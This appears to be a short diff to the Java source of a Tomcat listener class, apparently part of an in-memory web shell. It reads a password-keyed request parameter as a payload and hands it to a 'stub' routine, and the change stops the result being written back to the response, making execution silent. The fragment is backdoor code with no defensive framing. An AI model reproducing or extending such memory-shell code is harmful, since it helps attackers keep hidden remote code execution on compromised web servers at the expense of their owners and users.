@@ -16,9 +16,7 @@ public class TomcatListener extends ClassLoader implements InvocationHandler {{
         String payload = (String) invokeMethod(
             servletRequest, "getParameter", password
         );
-        invokeMethod(invokeMethod(response, "getWriter"),
-                "write", stub(payload, request, response)
-        );
+        stub(payload, request, response);
     }}
 
     @Override
